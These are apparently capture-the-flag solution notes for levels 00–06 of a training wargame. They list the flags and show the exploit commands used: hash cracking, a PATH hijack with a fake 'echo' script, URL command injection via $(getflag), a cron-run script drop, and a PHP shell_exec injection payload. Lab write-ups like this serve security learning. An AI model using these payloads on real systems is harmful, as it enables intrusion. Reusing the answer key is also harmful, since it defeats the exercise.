level00
find / -user flag00 2>/dev/null
cat /usr/sbin/john -> cdiiddwpgswtgt
chiffrement de cesar:
nottoohardhere
flag=x24ti5gi3x0ol2eh4esiuxias
------------------------------------------
level01
42hDRfypTqqnw
By default, it uses the insecure Data Encryption Standard (DES), but depending on the second argument, we can employ many others. Essentially, the initial characters of the password field value in /etc/shadow identify the encryption algorithm: $1$ is Message Digest 5 (MD5) $2a$ is blowfish.
hashcat -> mot de passe crypter avec DES (mode 1500)
42hDRfypTqqnw:abcdefg
flag=f2av5il02puano7naaf6adaaf
------------------------------------------
level02
We download pcap file from home user. After open it on whireshark, we followed packet tram to rerwrite password
We obtained "ft_wandr...NDRel.L0L" and a unauthorized message from server
Each point are equal to 7d => user tried to delete char but failed using del instead of backspace
We deduce that goodone passward was`ft_waNDReL0L`
flag=kooda2puivaav1idi4f57q8iq
------------------------------------------
level03
Il suffit juste de creer un script qui execute getflag qui est nommer "echo".
Car lorsque l'on fait `strings level03` on peut constater que le programe fait appel a
/usr/bin/env echo
donc l'environnement.
le script dans /tmp/echo doit contenir:
```sh
exec getflag
```
> export PATH=/tmp:$PATH
flag=qi0maab88jeaj46qoumi7maus
------------------------------------------
level04
Il s'agit d'une faille de style injection web.
http://192.168.1.31:4747/?x=$(getflag)
flag=ne2searoevaevoem4ov4ar8ap
------------------------------------------
level05
find / -user flag05 -type f -exec ls -lahh {} \; 2> /dev/null
le script bash execute a interval regulier dans le dossier /opt/openarenaserver, il suffit de mettre un script qui fait:
```
getflag > /tmp/out
```
ensuite attendre et cat /tmp/out en boucle.
flag=viuaaale9huek52boumoomioc
------------------------------------------
level06
Help:
    - https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
    - https://stackoverflow.com/questions/6103175/identify-and-execute-php-code-on-a-string
input: [x {${shell_exec(getflag)}}] inside /tmp/in and do:
{${}} do some string interpretation.
${...}: This syntax is commonly used in various programming languages and environments to denote the evaluation of an expression inside a string or template. It can be seen in PHP, JavaScript within template literals, and other environments.
> ./level06 /tmp/in
flag=wiok45aaoguiboiki2tuin6ub